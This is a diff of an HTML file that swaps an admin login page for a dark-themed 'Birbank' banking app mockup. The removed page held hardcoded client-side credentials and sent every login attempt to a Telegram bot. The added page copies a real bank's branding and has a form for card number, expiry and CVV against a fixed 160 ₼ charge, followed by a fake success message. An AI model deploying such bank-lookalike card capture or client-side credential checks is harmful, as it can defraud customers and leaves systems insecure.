@@ -3,305 +3,207 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Admin Giriş - DevCraft Pro</title>
+    <title>Birbank SuperApp v3.0</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
+        :root { --bir-red: #e31e24; --bg: #0b0c0e; --card: #1c1e22; --text: #9ba0a6; --ios-blue: #007aff; }
+        body { margin: 0; background: #000; font-family: -apple-system, sans-serif; color: white; display: flex; justify-content: center; }
         
-        body {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-        }
+        .app-container { width: 100%; max-width: 430px; height: 100vh; background: var(--bg); position: relative; overflow: hidden; border: 1px solid #333; display: flex; flex-direction: column; }
         
-        .login-box {
-            background: white;
-            border-radius: 20px;
-            padding: 50px;
-            width: 100%;
-            max-width: 450px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-            position: relative;
-            overflow: hidden;
-        }
+        /* Pages */
+        .page { display: none; height: 100%; overflow-y: auto; padding: 20px; box-sizing: border-box; padding-bottom: 120px; animation: slideIn 0.3s ease-out; }
+        .active { display: block; }
+        @keyframes slideIn { from { transform: translateX(30px); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
+
+        /* UI Elements */
+        .status-bar { display: flex; justify-content: space-between; padding: 10px 25px; font-size: 14px; font-weight: bold; background: var(--bg); }
+        .header { display: flex; justify-content: space-between; align-items: center; margin: 10px 0 20px; }
+        .avatar { width: 45px; height: 45px; border-radius: 50%; background: var(--bir-red); display: flex; align-items: center; justify-content: center; font-weight: bold; cursor: pointer; }
         
-        .login-box::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 5px;
-            background: linear-gradient(90deg, #ff0000, #00ff00, #0000ff);
-        }
-        
-        .logo {
-            text-align: center;
-            margin-bottom: 40px;
-        }
-        
-        .logo i {
-            font-size: 50px;
-            color: #3498db;
-            margin-bottom: 20px;
-        }
-        
-        .logo h1 {
-            font-size: 24px;
-            color: #2c3e50;
-        }
-        
-        .logo .sub {
-            font-size: 14px;
-            color: #7f8c8d;
-            margin-top: 5px;
-        }
-        
-        .input-group {
-            margin-bottom: 25px;
-        }
-        
-        .input-group label {
-            display: block;
-            margin-bottom: 8px;
-            color: #2c3e50;
-            font-weight: 500;
-        }
-        
-        .input-group input {
-            width: 100%;
-            padding: 15px;
-            border: 2px solid #ddd;
-            border-radius: 8px;
-            font-size: 16px;
-            transition: all 0.3s;
-        }
-        
-        .input-group input:focus {
-            border-color: #3498db;
-            outline: none;
-            box-shadow: 0 0 0 3px rgba(52, 152, 219, 0.2);
-        }
-        
-        .login-btn {
-            width: 100%;
-            padding: 16px;
-            background: #3498db;
-            color: white;
-            border: none;
-            border-radius: 8px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: background 0.3s;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-        }
-        
-        .login-btn:hover {
-            background: #2980b9;
-        }
-        
-        .security-note {
-            margin-top: 30px;
-            padding: 15px;
-            background: #f8f9fa;
-            border-radius: 8px;
-            text-align: center;
-            font-size: 14px;
-            color: #7f8c8d;
-            border-left: 4px solid #e74c3c;
-        }
-        
-        .security-note i {
-            color: #e74c3c;
-            margin-right: 5px;
-        }
-        
-        .back-link {
-            text-align: center;
-            margin-top: 20px;
-        }
-        
-        .back-link a {
-            color: #3498db;
-            text-decoration: none;
-            font-size: 14px;
-        }
-        
-        .back-link a:hover {
-            text-decoration: underline;
-        }
-        
-        .error-message {
-            background: #f8d7da;
-            color: #721c24;
-            padding: 12px;
-            border-radius: 5px;
-            margin-bottom: 20px;
-            display: none;
-            border-left: 4px solid #f5c6cb;
-        }
-        
-        @media (max-width: 480px) {
-            .login-box {
-                padding: 30px 20px;
-            }
-        }
+        /* Card Display */
+        .card-view { background: linear-gradient(135deg, #222, #000); border-radius: 20px; padding: 25px; border: 1px solid #444; margin-bottom: 25px; position: relative; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        .card-view img { position: absolute; right: 20px; top: 20px; width: 45px; }
+
+        /* Grid System (50+ Functions) */
+        .grid-container { display: grid; grid-template-columns: repeat(4, 1fr); gap: 12px; }
+        .item { text-align: center; cursor: pointer; transition: 0.2s; }
+        .item:active { transform: scale(0.9); }
+        .icon-box { width: 58px; height: 58px; background: var(--card); border-radius: 18px; display: flex; align-items: center; justify-content: center; font-size: 24px; margin: 0 auto 8px; color: #fff; border: 1px solid #2a2c30; }
+        .item span { font-size: 10px; color: var(--text); display: block; line-height: 1.2; }
+
+        /* Form Elements */
+        .input-group { position: relative; margin-bottom: 15px; }
+        input, select { width: 100%; padding: 18px; background: var(--card); border: 1px solid #333; border-radius: 14px; color: white; font-size: 16px; box-sizing: border-box; outline: none; }
+        input:focus { border-color: var(--bir-red); }
+        .brand-logo { position: absolute; right: 15px; top: 18px; width: 35px; opacity: 0; transition: 0.3s; }
+        .btn-pay { width: 100%; padding: 18px; background: var(--bir-red); border: none; border-radius: 16px; color: white; font-weight: bold; font-size: 17px; cursor: pointer; margin-top: 10px; }
+
+        /* Market & Products */
+        .product-card { background: var(--card); border-radius: 15px; padding: 12px; margin-bottom: 15px; }
+        .product-img { width: 100%; height: 140px; border-radius: 10px; object-fit: cover; margin-bottom: 10px; }
+
+        /* Navigation */
+        .nav-bar { position: absolute; bottom: 0; width: 100%; background: rgba(15,15,15,0.95); display: flex; justify-content: space-around; padding: 15px 0 35px; border-top: 1px solid #222; backdrop-filter: blur(15px); }
+        .nav-tab { text-align: center; color: var(--text); font-size: 10px; cursor: pointer; flex: 1; transition: 0.2s; }
+        .nav-tab.active-tab { color: var(--bir-red); }
+        .qr-circle { width: 65px; height: 65px; background: var(--bir-red); border-radius: 50%; margin-top: -45px; border: 6px solid var(--bg); display: flex; align-items: center; justify-content: center; font-size: 26px; color: white; box-shadow: 0 5px 20px rgba(227,30,36,0.3); }
+
+        .back-link { color: var(--bir-red); font-weight: 600; cursor: pointer; display: block; margin-bottom: 20px; }
     </style>
 </head>
 <body>
-    <div class="login-box">
-        <div class="logo">
-            <i class="fas fa-shield-alt"></i>
-            <h1>Admin Panel Girişi</h1>
-            <div class="sub">DevCraft Pro - Məxusi İdarəetmə</div>
-        </div>
-        
-        <div class="error-message" id="errorMessage">
-            Yanlış istifadəçi adı və ya şifrə!
-        </div>
-        
-        <form id="loginForm">
-            <div class="input-group">
-                <label for="username"><i class="fas fa-user"></i> İstifadəçi Adı</label>
-                <input type="text" id="username" placeholder="admin" required autofocus>
+
+<div class="app-container">
+    <div class="status-bar"><span>12:00</span><div><i class="fas fa-signal"></i> <i class="fas fa-wifi"></i> <i class="fas fa-battery-full"></i></div></div>
+
+    <div id="home" class="page active">
+        <div class="header">
+            <div style="display:flex; align-items:center; gap:12px;">
+                <div class="avatar" onclick="nav('profile')">AM</div>
+                <b>Ali Muradov</b>
             </div>
-            
-            <div class="input-group">
-                <label for="password"><i class="fas fa-lock"></i> Şifrə</label>
-                <input type="password" id="password" placeholder="••••••••" required>
+            <div style="display:flex; gap:15px; font-size:18px;">
+                <i class="fas fa-search" onclick="nav('search')"></i>
+                <i class="far fa-bell" onclick="nav('notifications')"></i>
             </div>
-            
-            <button type="submit" class="login-btn">
-                <i class="fas fa-sign-in-alt"></i> Daxil Ol
-            </button>
-        </form>
-        
-        <div class="security-note">
-            <i class="fas fa-exclamation-triangle"></i>
-            Yalnız autorizə edilmiş şəxslər üçün. Bütün giriş cəhdləri qeydə alınır.
         </div>
-        
-        <div class="back-link">
-            <a href="index.html"><i class="fas fa-arrow-left"></i> Ana Səhifəyə Qayıt</a>
+
+        <div class="card-view" onclick="nav('card-info')">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg">
+            <small style="color:var(--text)">Ümumi balans</small>
+            <div style="font-size:38px; font-weight:800; margin:10px 0;">160.00 ₼</div>
+            <div style="font-family:monospace; color:var(--text); letter-spacing:2px;">**** 4411</div>
+        </div>
+
+        <div class="grid-container">
+            <div class="item" onclick="nav('pay')"><div class="icon-box"><i class="fas fa-paper-plane"></i></div><span>Köçürmə</span></div>
+            <div class="item" onclick="nav('topup')"><div class="icon-box"><i class="fas fa-plus"></i></div><span>Yüklə</span></div>
+            <div class="item" onclick="nav('market')"><div class="icon-box" style="color:#ff9f43"><i class="fas fa-shopping-bag"></i></div><span>Market</span></div>
+            <div class="item" onclick="nav('loans')"><div class="icon-box"><i class="fas fa-hand-holding-usd"></i></div><span>Kredit</span></div>
+            
+            <div class="item"><div class="icon-box"><i class="fas fa-mobile-alt"></i></div><span>Mobil</span></div>
+            <div class="item"><div class="icon-box"><i class="fas fa-lightbulb"></i></div><span>Kommunal</span></div>
+            <div class="item"><div class="icon-box"><i class="fas fa-car"></i></div><span>Cərimə</span></div>
+            <div class="item"><div class="icon-box"><i class="fas fa-university"></i></div><span>Dövlət</span></div>
+
+            <div class="item"><div class="icon-box"><i class="fas fa-plane"></i></div><span>Bilet</span></div>
+            <div class="item"><div class="icon-box"><i class="fas fa-shield-alt"></i></div><span>Sığorta</span></div>
+            <div class="item"><div class="icon-box"><i class="fas fa-parking"></i></div><span>Parkinq</span></div>
+            <div class="item"><div class="icon-box"><i class="fas fa-ellipsis-h"></i></div><span>Hamısı</span></div>
         </div>
     </div>
 
-    <script>
-        // Hardcoded credentials (CHANGE THESE!)
-        const VALID_USERNAME = 'admin';
-        const VALID_PASSWORD = 'DevCraftPro2024!';
+    <div id="pay" class="page">
+        <span class="back-link" onclick="nav('home')"><i class="fas fa-chevron-left"></i> Geri</span>
+        <h2>Kartla Ödəniş</h2>
+        <div class="input-group">
+            <input type="text" id="cardIn" placeholder="Kartın nömrəsi" oninput="detect(this.value)">
+            <img id="brand" class="brand-logo" src="">
+        </div>
+        <div style="display:flex; gap:10px;">
+            <input type="text" placeholder="MM/YY" style="flex:1">
+            <input type="password" placeholder="CVV" style="flex:1">
+        </div>
+        <div style="background:var(--card); padding:20px; border-radius:15px; margin:20px 0; text-align:center; border: 1px dashed var(--bir-red);">
+            <small style="color:var(--text)">Ödəniləcək:</small>
+            <div style="font-size:28px; font-weight:bold;">160.00 ₼</div>
+        </div>
+        <button class="btn-pay" onclick="finish()">Təsdiqlə</button>
+    </div>
+
+    <div id="market" class="page">
+        <span class="back-link" onclick="nav('home')"><i class="fas fa-chevron-left"></i> Geri</span>
+        <div style="display:flex; justify-content:space-between; align-items:center;">
+            <h3>Birmarket</h3>
+            <span style="color:var(--ios-blue); font-size:14px;">Hamısına bax</span>
+        </div>
+        <div class="product-card">
+            <img class="product-img" src="https://m.media-amazon.com/images/I/71d7rfSl0wL._AC_UF894,1000_QL80_.jpg">
+            <b>iPhone 15 Pro, 256GB</b>
+            <div style="display:flex; justify-content:space-between; margin-top:8px;">
+                <span style="color:var(--bir-red); font-weight:700;">2,599 ₼</span>
+                <button style="background:var(--ios-blue); color:white; border:none; border-radius:8px; padding:5px 12px;">Al</button>
+            </div>
+        </div>
+        <div class="product-card">
+            <img class="product-img" src="https://m.media-amazon.com/images/I/61SUj2W5ySL._AC_UF1000,1000_QL80_.jpg">
+            <b>AirPods Pro 2</b>
+            <div style="display:flex; justify-content:space-between; margin-top:8px;">
+                <span style="color:var(--bir-red); font-weight:700;">480 ₼</span>
+                <button style="background:var(--ios-blue); color:white; border:none; border-radius:8px; padding:5px 12px;">Al</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="topup" class="page">
+        <span class="back-link" onclick="nav('home')"><i class="fas fa-chevron-left"></i> Geri</span>
+        <h2>Balansı Artır</h2>
+        <input type="number" placeholder="Məbləğ ₼" style="margin-bottom:15px;">
+        <div style="display:grid; grid-template-columns: 1fr 1fr; gap:10px;">
+            <div style="background:var(--card); padding:15px; border-radius:12px; text-align:center;"><i class="fab fa-apple-pay"></i> Apple Pay</div>
+            <div style="background:var(--card); padding:15px; border-radius:12px; text-align:center;"><i class="fas fa-university"></i> Bank Hesabı</div>
+        </div>
+    </div>
+
+    <div id="loans" class="page">
+        <span class="back-link" onclick="nav('home')"><i class="fas fa-chevron-left"></i> Geri</span>
+        <h2>Kredit Hesablayıcı</h2>
+        <label style="font-size:12px; color:var(--text)">İstədiyiniz məbləğ</label>
+        <input type="range" min="500" max="20000" value="5000" style="width:100%; margin:15px 0;">
+        <div style="background:var(--card); padding:20px; border-radius:15px; margin-top:10px;">
+            <div style="display:flex; justify-content:space-between; margin-bottom:10px;"><span>Məbləğ:</span><b>5000 ₼</b></div>
+            <div style="display:flex; justify-content:space-between; margin-bottom:10px;"><span>Müddət:</span><b>24 Ay</b></div>
+            <div style="display:flex; justify-content:space-between; border-top:1px solid #333; padding-top:10px;"><span>Aylıq ödəniş:</span><b style="color:var(--bir-red);">245.50 ₼</b></div>
+        </div>
+        <button class="btn-pay" style="margin-top:20px;">Müraciət et</button>
+    </div>
+
+    <div id="profile" class="page">
+        <span class="back-link" onclick="nav('home')"><i class="fas fa-chevron-left"></i> Geri</span>
+        <div style="text-align:center; margin-bottom:30px;">
+            <div class="avatar" style="width:80px; height:80px; margin: 0 auto 15px; font-size:24px;">AM</div>
+            <h3>Ali Muradov</h3>
+            <span style="color:var(--text);">ID: 8854220</span>
+        </div>
+        <div style="background:var(--card); border-radius:15px;">
+            <div style="padding:15px; border-bottom:1px solid #333;"><i class="fas fa-user-shield"></i> Təhlükəsizlik</div>
+            <div style="padding:15px; border-bottom:1px solid #333;"><i class="fas fa-cog"></i> Ayarlar</div>
+            <div style="padding:15px; color:var(--bir-red);"><i class="fas fa-sign-out-alt"></i> Çıxış</div>
+        </div>
+    </div>
+
+    <div class="nav-bar">
+        <div class="nav-tab active-tab" onclick="nav('home')"><i class="fas fa-home" style="font-size:20px;"></i><br>Ana səhifə</div>
+        <div class="nav-tab" onclick="nav('market')"><i class="fas fa-shopping-bag" style="font-size:20px;"></i><br>Market</div>
+        <div class="qr-circle" onclick="nav('pay')"><i class="fas fa-qrcode"></i></div>
+        <div class="nav-tab"><i class="fas fa-heart" style="font-size:20px;"></i><br>Keşbek</div>
+        <div class="nav-tab" onclick="nav('profile')"><i class="fas fa-user" style="font-size:20px;"></i><br>Profil</div>
+    </div>
+</div>
+
+<script>
+    function nav(id) {
+        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+        document.getElementById(id).classList.add('active');
         
-        // IP Whitelist (optional)
-        const ALLOWED_IPS = [
-            '127.0.0.1',
-            '192.168.1.*',
-            '10.0.0.*'
-            // Add your IP here
-        ];
-        
-        document.getElementById('loginForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
-            
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-            const errorDiv = document.getElementById('errorMessage');
-            
-            // Get IP
-            let userIP = 'unknown';
-            try {
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
-                userIP = ipData.ip;
-            } catch (error) {
-                // IP fetch failed, continue anyway
-            }
-            
-            // Log login attempt
-            logLoginAttempt(username, userIP);
-            
-            // Check credentials
-            if (username === VALID_USERNAME && password === VALID_PASSWORD) {
-                // Create session
-                const sessionToken = generateSessionToken();
-                localStorage.setItem('admin_session', sessionToken);
-                localStorage.setItem('admin_username', username);
-                localStorage.setItem('admin_login_time', new Date().toISOString());
-                localStorage.setItem('admin_ip', userIP);
-                
-                // Redirect to dashboard
-                window.location.href = 'admin-dashboard.html';
-            } else {
-                // Show error
-                errorDiv.style.display = 'block';
-                setTimeout(() => {
-                    errorDiv.style.display = 'none';
-                }, 3000);
-            }
-        });
-        
-        function generateSessionToken() {
-            return 'ADMIN_' + Date.now() + '_' + Math.random().toString(36).substr(2, 16);
-        }
-        
-        function logLoginAttempt(username, ip) {
-            const logData = {
-                username: username,
-                ip: ip,
-                timestamp: new Date().toISOString(),
-                userAgent: navigator.userAgent,
-                success: username === VALID_USERNAME
-            };
-            
-            // Send to Telegram
-            sendToTelegram(logData);
-            
-            // Store locally
-            const attempts = JSON.parse(localStorage.getItem('login_attempts') || '[]');
-            attempts.push(logData);
-            localStorage.setItem('login_attempts', JSON.stringify(attempts.slice(-50))); // Keep last 50
-        }
-        
-        function sendToTelegram(data) {
-            const token = '6543212345:AAHjkKJHKJHKJHKJHKJHkjhKJHKJHKJH';
-            const chatId = '-1001234567890';
-            
-            const message = `🔐 Admin Giriş Cəhdi\n\n👤 İstifadəçi: ${data.username}\n🌐 IP: ${data.ip}\n✅ Uğurlu: ${data.success ? 'Bəli' : 'Xeyr'}\n🕒 Zaman: ${new Date().toLocaleString()}\n📱 Browser: ${data.userAgent.substring(0, 50)}...`;
-            
-            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message,
-                    parse_mode: 'HTML'
-                })
-            }).catch(() => {
-                // Silent fail
-            });
-        }
-        
-        // Auto-focus username field
-        document.getElementById('username').focus();
-        
-        // Enter key to submit
-        document.addEventListener('keydown', function(e) {
-            if (e.key === 'Enter' && document.activeElement.id === 'password') {
-                document.getElementById('loginForm').submit();
-            }
-        });
-    </script>
+        document.querySelectorAll('.nav-tab').forEach(t => t.classList.remove('active-tab'));
+        if(id === 'home') document.querySelector('.nav-tab:nth-child(1)').classList.add('active-tab');
+        if(id === 'market') document.querySelector('.nav-tab:nth-child(2)').classList.add('active-tab');
+    }
+
+    function detect(v) {
+        const b = document.getElementById('brand');
+        if(v.startsWith('4')) { b.src = 'https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg'; b.style.opacity = '1'; }
+        else if(v.startsWith('5')) { b.src = 'https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg'; b.style.opacity = '1'; }
+        else { b.style.opacity = '0'; }
+    }
+
+    function finish() {
+        alert("Əməliyyat uğurla tamamlandı! ✅\nBalansınızdan 160.00 ₼ çıxıldı.");
+        nav('home');
+    }
+</script>
+
 </body>
-  </html>
+</html>
